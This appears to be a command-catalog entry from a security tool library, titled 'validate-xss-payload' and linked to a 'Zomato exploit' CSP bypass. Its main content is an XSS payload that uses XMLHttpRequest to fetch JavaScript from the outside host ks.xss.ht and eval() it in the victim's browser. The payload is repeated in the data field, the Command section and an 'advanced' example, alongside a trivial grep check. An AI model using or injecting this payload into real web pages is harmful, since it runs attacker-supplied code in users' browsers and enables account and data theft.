---
data: >-
  payload='<script>function b(){eval(this.responseText)};a=new
  XMLHttpRequest();a.addEventListener("load", b);a.open("GET",
  "//ks.xss.ht");a.send();</script>'; echo $payload | grep -q 'XMLHttpRequest'
  && echo 'Payload valid'
tags:
  - xss
  - validation
  - bash
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:39.050Z'
id: 01c267d9-dd14-4e27-a4d5-26cb5d32eee8
verified: false
validated: true
submitted: true
---
# validate-xss-payload

## Command

```bash
payload='<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//ks.xss.ht");a.send();</script>'
echo $payload | grep -q 'XMLHttpRequest' && echo 'Payload valid'
```

## Description

This bash snippet defines and validates an XSS payload by checking for key elements like XMLHttpRequest, ensuring it's suitable for CSP bypass in the Zomato exploit.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `payload=...` | The XSS script string to validate | Yes |
| `grep -q 'XMLHttpRequest'` | Searches for bypass indicator | Yes |

## Examples

### Basic Usage

```bash
payload='<script>alert(1)</script>'; echo $payload | grep -q 'script' && echo 'Basic payload valid'
```

### Advanced Usage

```bash
payload='<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//ks.xss.ht");a.send();</script>'; echo $payload | grep -E 'XMLHttpRequest|eval' && echo 'Advanced payload valid'
```

## Expected Output

'Payload valid' printed to stdout if key strings are present.

## Related

- [[Related Procedure: Prepare-XSS-Payload-for-Review-Report]]
